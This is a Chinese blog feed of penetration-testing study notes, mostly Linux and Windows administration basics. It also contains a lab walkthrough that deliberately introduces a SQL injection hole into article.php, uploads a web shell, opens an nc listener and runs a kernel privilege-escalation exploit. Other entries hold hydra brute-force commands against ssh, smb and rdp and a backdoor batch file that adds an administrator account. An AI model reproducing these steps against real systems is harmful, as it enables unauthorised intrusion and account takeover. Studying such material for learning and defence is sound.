    <content type="text"><![CDATA[vi是一个较大的unix命令,在启动的时候也有它自己的选项和参数 基本语法: vi [-options] [+[n]] [file] 常用选项有:-r , -R -r用于恢复系统突然崩溃时正在编辑的文件 -R用于以只读方式打开文件 +n用来指明进入vi后直接位于文件的第n行,如果不指定n,则位于最后一行 # cp /etc/resolv.conf ss # cat ss # vi +3 ss --光标停在第3行 # vi ss --光标停在第1行 必须用一些命令来操作 命令模式 按dd --删除本行 按D --删除从光标到行尾 按p --就粘贴回来 按i --在光标前面插入 按A --在行尾插入 按R --在行首插入 按o --在下一行插入 按O --在上一行插入 按u --返回上一步操作 按22 + dd --删除22行 -- 插入模式 按a --进入插入模式 按ESC --退回原始模式 就可以编辑了 按ESC+shift+; --进入底行模式 (输入一些字符命令进行操作) 输入q+回车 --退出模式(q+!)(强制退出) 输入wq --保存并退出 输入w --保存 文本插入: 在命令方式下使用某些命令会导致vi马上进入文本插入方式,这些命令包括:i,I,a,A,o,O等 在这种方式下用户的任何输入都被当做是文件的内容看待,并将其显示在屏幕上 a:在光标后附加文本 A:在本行行末附加文本 i:在光标前插入文本 I:在本行开始插入文本 o:在光标下插入新行 O:在光标上插入新行 搜索和替换: /string --向前搜索指定字符串,搜索时忽略大小写:set ic n --搜索指定字符串的下一个出现位置 :%s/old/new/g --全文替换字符串 :n1,n2s/old/new/g --在一定范围内替换指定字符串 按shift+: 输入set nu --显示行号 /内容+回车 --搜索&quot;内容&quot; 按n --向下搜索 ?内容 --向上搜索 按n --向上搜索 :%s/old内容/new内容/g --全文替换 :1,5s/old内容/new内容/g --1,5行替换 重复前一命令:. 取消上一命令:u 退出vi:行方式下使用q,行命令x相当于:wq命令.在命令方式下使用命令ZZ等效于:x命令 如果由于读写权限或是更新方面的问题,导致vi拒绝执行保存文件或退出vi的命令,那么可以在命令后加一个!号表示强制执行 cat命令: cat --显示出文件的全部内容 -n --给输出的所有行加上编号 cat 1 2 &gt; 3 --合并文件 将文件1和2合并到3,如cat 1 2 3...&gt;n # cat /etc/passwd root:x:0:0:root:/root:/bin/bash 用户名:x代表影子密码,密码放在其他位置:UID号0基本代表管理员:GID号(组id) :所在分组名称(家目录) /bin/bash:所使用的shell,bin下或bash下都能登录这个终端 像sbin,nologin是不能登录终端的. 密码存放位置: # cat /etc/shadow !! 代表没有密码 有密码的就MD5加密了 用which命令查看cat命令在哪一目录下 # which cat /bin/cat --普通用户都能用 # cat -n ss # date --显示日期 # date &gt; 1 --将date信息导入到1 # cat 1 # cat 1 ss # cat 1 ss &gt; 2 # cat 2 wc 统计文件中的单次数量 字节数 行数 -l 统计行数 -w 统计单词数 -c 统计字符数 wc sdxh.txt 会出现 2 4 26 2是行数 4是单词数 26是字符数 history查看历史命令 # wc -l ss 归档和压缩命令 gzip bzip2 (多个文件归成1个文件) 只针对单个文件压缩或 -9 显示高压缩比 -d 释放压缩文件 gzip 文件名 压缩文件 格式为后缀有.gz bzip2 文件名 压缩成的文件名 格式为 文件名.bz2 它相对于gzip压缩率更高 # ls -lh # gzip install.log install.log.gz (或者高压缩) # gzip -9 install.log install.log.gz # ls -lh # gzip -d install.log.gz # ls -lh # bzip2 install.log install.log.bz2 # ls -lh tar(归档命令)(释放归档文件)(没有压缩功能) 格式 tar 选项 归档文件名 源文件或目录 -c 创建归档文件 扩展名为.tar -v 输出详细信息 -f 表示使用归档文件 如 -cvf 创建归档文件 tar -cvf 4.tar 1 2 3 将文件1 2 3 打包归档为4.tar tar -xvf 4.tar --解包归档文件4.tar --xvf 解包归档文件 -x 解开归档文件 -t 列表查看包内的文件 tar -tvf 4.tar -r --追加TAR文件至归档结尾 tar -rvf 4.tar 5 --把5加入4.tar -p --解包时保留原始文件及目录的权限 -C --解包时指定释放的目录文件夹 -z --调用gzip程序,进行解压或压缩 -j 调用bzip2 程序进行压缩或解压 tar -cvzf test.tar.gz --被压缩的文件1 被压缩的文件2 创建归档压缩文件 后缀为gz tar -cvjf test.tar.bz2 被压缩的文件1 被压缩的文件2 创建归档压缩文件 后缀为bz2 tar -xvzf test.tar.gz -C /usr/src 解压释放归档到 /usr/src里面 tar -xvjf test.tar.bz2 -C /usr/src 解压释放到归档到 /usr/src里面 # tar -cvf 3.tar 1 2 ss -cvf创建一个归档 归档名为3.tar 将 1 2 ss归档到一起 (先归档再压缩) # gzip 3.tar 3.tar.gz # ll # rm -rf 1 2 ss # tar zxvf 3.tar.gz (归档的文件一般用tar解压) # ll # tar jxvf 4.tar.bz2 (用jxvf解压bz2,用zxvf解压gz) 安装,升级,卸载RPM软件包 2-1 安装或升级RPM软件 格式:rpm [选项] RPM包文件 用法:不同选项适用于不同情况 -i:安装一个新的rpm软件包 -U:升级某个rpm软件,若原本未装,则进行安装 -F:更新某个rpm软件,若原本未装,则放弃安装 卸载指定的RPM软件 格式:rpm -e 软件名 辅助选项 --force:强制安装所指定的rpm软件包 --nodeps:安装,升级或卸载软件时,忽略依赖关系 -h:以&quot;#&quot;号显示安装的进度 -v:显示安装过程中的详细信息 RPM软件包封装的,需要安装RPM # cd /media # cd VMware\ Tools/ # ls # tar zxvf VMwareTools-9-9.2-2496486.tar.gz -C /root/ # cd # ls # cd vmare-tools-distrib/ (./ --代指运行) (# ll 文件末尾要有-x,才是有权限 有权限才能添加) # ./ vmware-install.pl # chmod 644 vmware-install.pl 失去权限 # ./vmware-install.pl # chmod 755 vmware-install.pl 添加权限 -rwxr-xr-x. rwx 用户权限 r-x 分组权限 每一个权限加起来是7 rwx 421 rwxrwxrwx 777 rwxr-x--x 751 # chmod u-w vmware-install.pl u:所有者,g:组,o:其他人 -w 失去w功能 安装要装载CD # umount /dev/sr0 --先卸载一下 # mount /dev/sr0 /media # ls /media # ls /media/Packages/ # ls /media/Packages/ &gt;12 # wc -l 12 安装man软件(# rpm -ivh /media/Packages/man-1.6....rpm) # cd /media # cd Packages/ # rpm -ivh man-1.6f...rpm # man ls # rpm -e man --卸载man # clear 查看已安装软件 # rpm -qa # rpm -qa man --查看有没有安装man # rpm -qi man --查看详细信息 # rpm -ql man --查看安装目录 第二种方法: 编译安装过程 下载源代码安装包文件 源代码:1.tar.gz 2.自带安装程序 3.编译配置才能安装的 步骤1:tar解包 步骤2:./configure配置 用途:设置安装目录,安装模块等选项 步骤3:make编译 用途:生成可执行的二进制文件 步骤4:make install安装 用途:复制二进制文件到系统,配置应用环境 --测试及应用,维护软件 首选安装方法: 依赖关系的软件安装: # yum -y install firefox --安装一些软件 # vi /etc/yum.repos.d/rhel-source.repo --通过vi编辑它 区分:firefox的就可以直接安装,make的需要配置, 修改的地方: [rhel-source-beta] 底行模式: .,$d .:光标所在行 ,:到 $:最后 d:删除 [rhel-source] enabled=0-&gt;enabled=1 按r再按1 --替换 baseurl=f-&gt;按D,之后的全部删除 按a baseurl=file:///media/Server --路径 复制gpgkey里面的-&gt;/etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release wq 导入秘钥 # rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release # yum -y install firefox 必须指定位置,yum才能安装成功 apt-get --kali安装方法,需要保证联网 apt-get install xxx. dpkg dpkg -i xx dpkg -l dpkg -r xx 添加用户账号: useradd命令: 格式:useradd [选项]... 用户名 常用命令选项: -u:指定UID标记号 -d:指定宿主目录,缺省为 /home/用户名 -e:指定账号失效时间 -g:指定用户的基本组名(或UID号) -G:指定用户的附加组名(或GID号) -M:不为用户建立并初始化宿主目录 -s:指定用户的登录shell &lt;!-- # yum -y remove man --卸载 --&gt; # useradd cracer # ls /home # su - cracer --切换用户 # passwd cracer --更改密码 123 123 用户添加示例: 指定mike的基本组为mike,并加入到ftpuser组;指定主目录为/ftphome/mike;不允许mike通过本地登录服务器 [root@localhost~]# useradd -d /ftphome/mike -g mike -G ftpuser -s /sbin/nologin mike --对应的基本组,附加组必须存在 删除用户账号--userdel userdel命令: 格式:userdel [-r] 用户名 添加 -r 选项时,表示连用户的宿主目录一并删除 [root@localhost~]# useradd stu01 [root@localhost~]# ls -ld /home/stu01/ drwx-----2 stu01 stu01 4096 09-09 12:38 /home/stu01/ [root@localhost~]# userdel -r stu01 --加-r会把家目录也删除 [root@localhost~]# ls -ld /home/stu01/ ls:/home/stu01/:没有那个文件或目录 Linux系统网路配置: 查看网络接口信息--ifconfig 查看所有活动网络接口的信息 执行ifconfig命令 查看指定网络接口信息 格式:ifconfig 网络接口名 [root@localhost~]# ifconfig eth0 --eth0:代指网卡名,自己写 eth0 Link encap:Ethernet HWaddr 00:0C:29:57:8B:DO inet addr:192.168.4.11 Boast:192.168.4.255 Mask:255.255.255.0 ...... 网卡类型: 名称 类型 eth0 以太网 lo (虚拟)回环设备 ppp0 使用PPP协议打的串口设备(通常指调制解调器) tr0 令牌环(Token Ring) fddi0 光纤 查看主机名称--hostname hostname命令 查看或设置当前主机名; 格式:hostname 查看路由表条目---route route命令 查看或设置主机中路由表信息 格式:route [-n] # route -n 查看网络连接情况--netstat netstat命令 查看系统的网络连接状态,路由表,接口统计等信息 格式:netstat [选项] 常用选项: -a:显示所有活动连接 -n:以数字形式显示 -p:显示进程信息 -t:查看TCP协议相关信息 -u:查看UDP协议相关信息 -r:显示路由表信息 # netstat -anpt | grep:21 设置路由记录---route 删除路由表中的默认网关记录 格式:route del default gw IP地址 向路由表中添加默认网关记录 格式:route add default gw IP地址 添加到指定网段的路由记录 格式:route add -net 网段地址/24 gw IP地址 删除到指定网段的路由记录 格式:route del -net 网段地址 网络接口配置文件 /etc/sysconfig/network-scripts/目录下的 ifcfg-eth0:第1块以太网卡的配置文件 ifcfg-eth1:第2块以太网卡的配置文件 ... # ls /etc/sysconfig/network-scripts/ifcfg-* # ls /etc/sysconfig/network-scripts/ifcfg-eth0 DEVICE=eth0 ONBOOT=yes -- BOOTPROTO=static IPADDR=192.168.4.1 --IP NETMASK=255.255.255.0 --子网掩码 GATEWAY=192.168.4.2 --网关 静态改IP(改东西必须用vi命令) # vi /etc/sysconfig/network-scripts/ifcfg-eth0 启用,禁用网络接口配置 重启network网络服务 # service network restart 正在关闭接口 eth0: [确定] 关闭环回接口: [确定] 弹出环回接口: [确定] 弹出界面eth0: [确定] 禁用,启用网络接口 # ifdown eth0 # ifup eth0 域名解析配置文件 /etc/resolv.conf文件 用途:保存本机需要使用的DNS服务器的IP地址 # vi /etc/resolv.conf search localdomain nameserver 202.106.0.20 --DNS的IP地址 实战: linux安装apache,搭建网站,.... (需要安装5个软件包) (可以直接安装多个软件包) # yum -y install httpd php mysql mysql-server php-mysql (httpd:代表apache) (mysql-server:mysql服务器) (php-mysql:两者连接的软件) -&gt; 给网站权限 # ls /var/www/html/ 启动服务 # service httpd start # service mysqld start 设置mysql密码 # mysqladmin -uroot password 123456 登录mysql # mysql -uroot -p123456 mysql&gt; show databases mysql&gt; use mysql; mysql&gt; select * from admin; mysql&gt; show tables; mysql&gt; select * from user; 退出 mysql&gt; quit; 访问192.168.80.140 访问不到 将防火墙配置到最低,将防火墙策略清空 # iptables -F 复制测试平台-&gt;var-&gt;www-&gt;html-&gt;复制过去 [root@cracer var]# chown -R root www 改权限,递归改 apache是程序用户,安装完成之后自动添加 [root@cracer var]# chown -R apache www 复制测试平台-&gt;var-&gt;www-&gt;html-&gt;复制过去 login-&gt;admin+回车 修改数据库-&gt; jian root 123456 查找网站漏洞-&gt; http://192.168.80.138/article.php?id=5 http://192.168.80.138/article.php?id=5 and 1=1 (此测试网站已被审计改过) 手动修改成有漏洞的网站-&gt; [www]# cd html/ [html]# vi article.php 删除if(id==&apos;&apos;){};这一条 在下一个if里面找 WHERE id=&apos;&quot;.#_REQUEST[&apos;id&apos;].&quot;&apos;,#db --将&quot; &quot;删除 http://192.168.80.138/article.php?id=5 and 1=1 如果网站没有变化,则说明有漏洞 -&gt;把1改成2 测试 注入-&gt; 复制http://192.168.80.138/article.php?id=5 and 1=1 到Pangolin -&gt;将木马cc(2).php放入到网站,改名为cc.php http://192.168.80.138/cc.php 提权-&gt; 先将防火墙关闭 win_cmd-&gt;nc.exe -l -n -v -p 12666 --12666是端口 在网站木马执行命令: uname -r --查看内核版本 exp-&gt;linux-&gt;3.2-&gt;2.6.32.c复制 或者直接在网站木马上传 上面输入/tmp/,选择文件,上传 win-&gt; cd tmp gcc 2.6.32.c 找a.out (xxx.out文件) -&gt;执行a.out a.out]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(5)-linux常用命令及目录结构]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-5-linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%8A%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[Linux系统目录结构: 文件系统(类似我的电脑)-&gt;有很多目录 bin(存放普通用户可以运行的命令) sbin(存放只有管理员用户才能执行的命令) boot(存放linux操作系统引导的配置文件) dev(存放存储文件,包括硬盘) etc(存放系统和应用的配置文件) home(存放普通用户的家目录) lib(存放函数库文件) lost+found(一个分区挂在这) media/mnt(存放挂载光盘,一些外来介质) opt(安装外围的大型程序) proc(随着开机生成的进程信息) root(超级用户的目录) selinux(对程序进行控制的) srv() sys(存放系统配置文件的) tmp(临时文件) usr(安装一些外部程序usr/local,usr/src) var(日志,安装apache根目录等) 树形目录结构 最顶层:根目录 命令行提示符&quot;#&quot;代表root登录的时候就是# RHEL6中默认安装的桌面环境是:(Jnomo?)桌面(一般不耗费较多资源),KDE桌面 从字符界面切换到图形界面: Ctrl+Alt+F2-&gt;进入字符界面 ,需要登录 可以开:F2-F7都是字符界面 Ctrl+Alt+F1-&gt;进入图形化界面 (新手上手红帽,再kali) Linux常用命令: Linux命令: 用于实现某一类功能的指令或程序 命令的执行依赖于解释器程序(reg:/bin/bash) Linux命令的分类: (内部自带的命令) 内部命令:属于Shell解释器的一部分 (安装程序之后的命令) 外部命令:独立于Shell解释器之外的程序文件. linux命令行格式2-1 通用命令格式: 命令字 [选项] [参数] 选项及参数含义 选项:用于调节命令的具体功能 以&quot;-&quot;引导短格式选项(单个字符),例如&quot;-l&quot; 以&quot;--&quot;引导长格式选项(多个字符),例如&quot;--color&quot; 多个短格式选项可以写在一起,只用一个&quot;-&quot;引导,例如&quot;-al&quot; 参数:命令操作的对象,如文件,目录名等. [root@localhost~]#ls -l /home 总计8 drwx------2 benet benet 4096 09-08 08:50 benet linux命令行格式2-2 命令行编辑的几个辅助操作 Tab键:自动补齐 反斜杠&quot;\&quot;:强制换行 Ctrl+U:清空至行首 Ctrl+K:清空至行尾 Ctrl+L:清屏 Ctrl+C:取消本次命令编辑 -&gt;SecureCRT -&gt;创建会话new Session Wizard-&gt;SSH2(相当于win下的charnet) -&gt;ip,port,password -&gt;Accept&amp;Save -&gt;进入编辑 获得命令帮助 内部命令help 查看Bash内部命令的帮助信息 命令的&quot;--help&quot;选项 适用于大多数外部命令 使用man命令阅读手册页 使用&quot;↑&quot;,&quot;↓&quot;方向键滚动文本 使用Page Up和Page Down键翻页 按Q或q键退出阅读环境,按&quot;/&quot;键后查找内容 查看系统内核信息--uname uname命令: 查看系统相关信息 常用命令选项: -a:显示主机名,内核版本,硬件平台等详细信息 -r:显示内核版本 reg: [root@localhost~]# uname -r 2.6.18-194.el5 # which uname --查看路径 查看系统主机名--hostname hostname命令: 查看主机的完整名称 包括主机名称,所在域的名称 reg: [root@localhost~]# hostname localhost.localdomain 查看IP--ifconfig # ifconfig --查看全部ip # ifconfig eth0 --查看自己的ip 查看系统CPU信息/内存信息 查看CPU信息 /proc/cpuinfo [root@localhost~]# cat /proc/cpuinfo processor :0 vendor_id :GenuineIntel cpu family :6 model :23 model name :Intel(R) Celeron(R) CPU E3200 @ 2.40GHz stepping :1.0 cpu MHz :2394.029 cache size :1024KB ... 查看内存信息 /proc/meminfo [root@localhost~]# cat /proc/meminfo 关机及重启操作 关机操作 shutdown,poweroff [root@localhost~]# shutdown -h now [root@localhost~]# poweroff [root@localhost~]# halt 重启操作 shutdown,reboot [root@localhost~]# shutdown -r now [root@localhost~]# reboot 查看及切换目录 pwd命令 用途:查看工作目录(Print Working Directory) cd命令 用途:切换工作目录(Change Directory) 格式:cd [目录位置] [root@localhost~]# cd /etc/httpd --绝对路径 [root@localhost httpd]# cd/conf --相对路径 [root@localhost conf]# cd~benet --相对路径 [root@localhost benet]# pwd /home/benet [root@localhost zhangsan]# ls -dl../jerry --相对路径 drwx-----2 jerry jerry 4096 09-14 2150 ../jerry 目录操作命令-ls ls命令 用途:列表(List)显示目录内容 格式:ls [选项]... [目录或文件名] -l:以长格式显示 -a:显示所有子目录和文件的信息,包括隐藏文件 -A:类似于&quot;-a&quot;,但不显示&quot;.&quot;和&quot;..&quot;目录的信息 -h:以更易读的字节单位(K,M等)显示信息 -R:递归显示内容 --color:以颜色区分不同类型文件 ls -l: /*-rwxr-xr-x.*/权限(读,写,可执行) 1 /*root*/创建人 /*root*/所在分组 /*73*/大小B /*9月 17 2015*/创建日期 /*ifcfg-eth0*/文件名 -rwx:代表所有者权限 r-x(中间):代表组对其的权限 r-x(后面):代表其他人权限 第一个如果是&quot;l&quot;,就代表是链接,x:可执行 目录操作命令--du du命令: 用途:统计目录及文件的空间占用情况(estimate space usage) 格式:du [选项]... [目录或文件名] 常用命令选项: -a:统计时包括所有的文件,而不仅仅只统计目录 -h:以更易读的字节单位(K,M等)显示信息 -s:只统计每个参数所占用空间总的大小 [root@localhost~]# du -sh /home 72K /home 创建目录命令--mkdir mkdir命令: 用途:创建新的目录(Make Directory) 格式:mkdir [-p] [/路径/]目录名 [root@localhost~]# mkdir -p /multimedia/movie/cartoon [root@localhost~]# ls -R /multimedia /multimedia: movie /multimedia/movie: cartoon /multimedia/movie/cartoon: 创建文件命令--touch touch命令: 用途:新建空文件,或更新文件时间标记 格式:touch 文件名... [root@localhost~]# cd /multimedia/movie/cartoon [root@localhost cartoon~]# touch HuaMulan.rmvb NeZhaNaoHai.mp4 [root@localhost cartoon]# ls -lh 总计 0 -rw-r--r-- 1 root root 0 02-11 21:44 HuaMulan.rmvb -rw-r--r-- 1 root root 0 02-11 21:44 NeZhaNaoHai.mp4 创建连接文件--ln ln命令: 用途:为文件或目录建立链接(Link) 格式:ln [-s] 源文件或目录... 链接文件或目标目录 常用命令选项: -s:建立符号链接文件(省略此项则建立硬链接)(快捷方式) [root@localhost~]# ln -s /etc/httpd/conf/httpd.conf /etc/ [root@localhost~]# ls -lh /etc/httpd.conf lrwxrwxrwx 1 root root 26 05-02 01:54 /etc/httpd.conf -&gt; /etc/httpd/conf/httpd.conf [root@localhost~]# ln /usr/sbin/system-config-network /sbin/netconfig [root@localhost~]# ls -lh /sbin/mynetconfig -rwxr-xr-x 2 root root 188 2007-01-08 /sbin/mynetconfig ---cat:查看文件 复制文件或目录--cp cp命令: 用途:复制文件或目录 格式:cp [选项]... 源文件或目录... 目标文件或目录 常用命令选项: -r:递归复制整个目录树 -p:保持源文件的属性不变 -f:强制覆盖目录同名文件或目录 -i:需要覆盖文件或目录时进行提醒 [root@localhost~]# cp -r /boot/grub/ /etc/host.conf public_html/ 删除文件或目录---rm rm命令 用途:删除文件或目录 格式:rm [选项]... 文件或目录 常用命令选项: -f:强行删除文件或目录,不进行提醒 -i:删除文件或目录时提醒用户确认 -r:递归删除 [root@localhost~]# rm -rf public_html/grub/ 移动文件或目录----mv mv命令: 用途:移动文件或目录 --若如果目标位置与源位置相同,则相当于改名 格式:mv [选项]... 源文件或目录... 目标文件或目录 [root@localhost~]# mv mytouch mkfile [root@localhost~]# ls -lh mytouch mkfile ls:mytouch:没有那个文件或目录 -rwxr-xr-x 1 root root ... mkfile reg: mv cracer /seven/ 移动到seven下 如果在同一目录下 mv cracer seven 就是改名为seven 查找文件或目录---find find命令 用途:用于查找文件或目录 格式:find [查找范围] [查找条件] 常用查找条件: -name:按文件名查找 -size:按文件大小查找 -user:按文件属主查找 -type:按文件类型查找 [root@localhost~]# find /etc -name &quot;resol*.conf&quot; /etc/resolv.conf /etc/sysconfig/networking/profiles/default/resolv.conf reg: find / -name cracer 进入vi: vi是一个较大的unix命令,在启动的时候也有它自己的选项和参数 基本语法: vi [-options] [+[n]] [file] 常用选项有:-r , -R -r用于恢复系统突然崩溃时正在编辑的文件 -R用于以只读方式打开文件 +n用来指明进入vi后直接位于文件的第n行,如果不指定n,则位于最后一行]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(4)-IIS安装与linux安装]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-4-IIS%E5%AE%89%E8%A3%85%E4%B8%8Elinux%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[IIS安装多个网站 1.多IP 2.同IP多端口 3.域名 cmd-&gt;ncpa.cpl 绑定域名就不能用IP访问,只能用域名访问,如果你没有定义DNS解析域名的话,就访问不到. IIS-&gt;添加-&gt;自定义-&gt;DNS服务器. 开始-&gt;管理-&gt;DNS-&gt;baidu.com 选中-&gt;右侧右键-&gt;新建主机-&gt;www,IP 本地连接-&gt;IPv4-&gt;下方DNS输入 IIS-&gt;主目录-&gt;纯脚本......(看其他笔记) TODO------------27min之前没看完 linux: linux没有盘符,全是文件夹的形式. 1.linux系统的介绍,安装,密码的破解 2.linux系统目录结构,常用命令 3.linux系统网络配置 linux系统的介绍: 操作系统:有ibm-&gt;unix(比较昂贵) Unix是由美国电话电报公司(AT&amp;T)贝尔实验室两个工程师所创造的操作系统,它 允许计算机同时处理多用户和程序.价钱昂贵,性能和稳定性比较好. 目前大型政府单位,大型企业,航空公司,金融机构都在使用. Unix和硬件配套卖的. linux:可以运行在PC机上类似于Unix风格的操作系统,由众多程序员通过Internet协作开发. (Open Source) 自由软件(Free Software)定义是自由的软件而不是免费的软件. 使用自由,研究自由,散布自由,改良自由 Linus Torvalds,芬兰人,芬兰吉祥物:企鹅 linux系统结构: 由内核及应用程序组成. 不同的厂商根据各自的需要将各种应用软件和Linux内核一起打包即成为一个Linux发行版本 发行版本(distribution) Linux常见的发行版本: RedHat Linux(常见) SuSE Linux(安全性高,比较卡) Ubuntu Linux Mandrake Linux Caldera Linux Turbolinux Linux Debian GNU/Linux(适用个人用户) Gentoo Linux Linpus Linux 优点: 1.免费,收费是维护的时候 2..... 更佳的性能2-1 CentOS 5.3 vs Windows Server 2003 Apache Tomcat Jboss 静态页面访问性能比较 硬件平台:CPU Xeon2.0x4,内存4GB 更佳的性能2-2 磁盘IO性能测试 将小文件从硬盘拷到硬盘(603MB)(12文件夹2154个文件) 安全性更好: 病毒,木马相对少 高性能计算机: 基本都在用Linux 新浪 Google QQ NEC,摩托罗拉,诺基亚,三星都有Linux手机 亚马逊 SONY的PS2游戏机 中国国家邮政局 德国慕尼黑 美国天气预报 如何学习linux: 1.从命令开始打基础 2.选一本好书 3.养成在命令行下工作的习惯 4.学习shell命令解释器 5.实践 6.学会使用文档 7.在Linux论坛获取帮助 8.学习专业英文 4.ISCE 安装: 内核版本2-1 提权,版本号,找相应的漏洞 XX.YY.ZZ YY:主版本号 ZZ:次版本号 reg: 2.5.7 奇数表示开发板本 2.6.18 偶数表示稳定版本 稳定版本2.4.6-&gt;2.4.7-&gt;修复BUG-&gt;2.4.8-&gt;2.4..... 开发版本2.5.7-&gt;2.5..-&gt;增加新功能-&gt;2.5.77 -&gt;拷贝-&gt;稳定版本2.6.1-&gt;2.6.... 磁盘分区表示: Linux中将硬盘,分区等设备均表示为文件. /dev/hda5 dev:硬件设备文件所在的目录 hd:表示IDE设备(hd的硬盘); sd:表示SCSI设备; a:硬盘的顺序号,以字母a,b,c...表示 代表第几块硬盘 5:分区的顺序号,以数字1,2,3...表示 代表第几个分区 这里,前4个是主分区,5代表第1个逻辑分区 第1个主分区:/dev/hda1 第2个主分区:/dev/hda2 第1块SCSI硬盘设备/dev/sda 第1个逻辑分区/dev/hda5 第2个逻辑分区/dev/hda6 扩展分区 文件系统类型: Linux中默认使用的文件系统类型: EXT4,第3代扩展(Extended)文件系统 SWAP,交换文件系统(相当于win的虚拟内存,reg:如果是2G,则分win的2048-4096内存(1-2倍)) Linux支持的其它文件系统类型 FAT16,FAT32,NTFS(Win用的多) XFS,JFS ... RHEL6-&gt;红帽6: 默认是EXT4 安装RHEL6系统: 安装步骤: 1.引导 设置主机引导设备为光盘驱动器 从光盘启动主机 2.检测安装光盘的完整性 3.配置安装程序 选择安装过程显示语言,键盘类型,初始化磁盘,分区 设置网络地址,系统时区,管理员口令 定制要安装的软件包 4.复制文件并完成安装过程 初始化RHEL系统: 用户许可协议 网络防火墙配置 SELinux配置 Kdump配置 系统日期和时间的设置 设置软件更新 添加系统用户 声卡测试 安装附加光盘 VM-&gt;RHEL6 32-&gt;20G CD-&gt;rhel-server-6.2-i386-dvd.iso 1.安装/升级系统 2.安装系统使用基本驱动 3.救援系统(选1就行) -&gt;skip-&gt;next-&gt;Chinese-&gt;美国式英语-&gt;是,丢弃所有设备 -&gt;Create Custom Layout(自定义创建分区)-&gt;sda-&gt;空闲-&gt;创建 -&gt;标准分区-&gt;创建-&gt;挂载点:/boot(挂载引导配置信息的地方) -&gt;文件大小200M-&gt;确定 -&gt;空闲-&gt;创建-&gt;文件系统类型-&gt;swap-&gt;大小2048MB -&gt;空闲-&gt;创建-&gt;挂载点:/-&gt;勾选使用全部可用空间-&gt;确定 -&gt;下一步-&gt;格式化-&gt;write *如果是U盘安装的时候,必须把/dev/sda改成/dev/sdb -&gt;下一步-&gt;最小-&gt;勾选现在定制-&gt;下一步 -&gt;桌面-&gt;X窗口系统,图形管理工具,字体,桌面,输入法 开发-&gt;勾选开发工具;语言支持-&gt;中文支持-&gt;下一步]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(3)-hydra与netstat]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-3-hydra%E4%B8%8Enetstat%2F</url>
    <content type="text"><![CDATA[hydra: 一般可以爆破ssh密码 爆破https # hydra -m /index.php -l username -P pass.txt IP https 爆破teamspeak 爆破cisco 破解smb # hydra -l administrator -P pass.txt IP smb 破解pop3 破解rdp # hydra IP rdp -l administrator -P pass.txt -V -&gt; 映射盘符 -&gt; 留后门.bat copy con c:\123.bat net user cracer 123 /add net localgroup administrators cracer /add shutdown -s -t 1800 -c &quot;hacked by cracer&quot; ctrl+z netstat -an --查看端口,及连接情况 attrib 文件名(目录名) 查看某文件(目录)的属性 attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的存档,只读,系统,隐藏属性;用+则是添加为某属性.]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(2)-系统日志与端口与注册表]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-2-%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E4%B8%8E%E7%AB%AF%E5%8F%A3%E4%B8%8E%E6%B3%A8%E5%86%8C%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[系统日志信息: perflogs: 管理-&gt;系统工具-&gt;事件查看器-&gt;windows日志-&gt;setup 服务:services.msc 是一种应用程序类型,在后台运行.服务应用程序通常可以在本地和通过网络为用户提供一些功能. 作用: 服务决定了计算机的一些功能是否被启用 不同的 服务对应的功能不同 通过计算机提供的服务可以有效实现资源共享 常见的服务: web,dns,dhcp,邮件,telnet,ssh,ftp,smb 访问共享: (期间可以设置权限) cmd-&gt;\\192.168.80.137 端口:(port) 可以认为是计算机与外界通讯交流的出口.按端口号可分为3大类: 公认端口(Well Known Ports);注册端口(Registered Ports);动态和/私有端口(Dynamic and/or Private Ports) 一台拥有IP地址的主机可以提供许多服务,用&quot;IP地址+端口号&quot;来区分不同的服务的 端口并不是一一对应的. 知名端口():0-1023 动态端口:1024-65535 动态端口常被木马利用,如冰河默认连7626,WAY 连8011,Netspy 7306,YAI是1024 端口按协议分为TCP,UDP和ICMP(Internet控制消息协议) TCP端口:传输控制协议端口,需要在客户端和服务端之间建立连接.reg:有21,23,25,80 UDP端口:用户数据包协议段可可,无需在客户端和服务器之间建立连接.reg:有53,161,80000和40000 常见的端口: HTTP协议代理服务器常用端口号:80/8080/3128/8081/9080 FTP(文件传输)协议代理服务器常用端口号:21 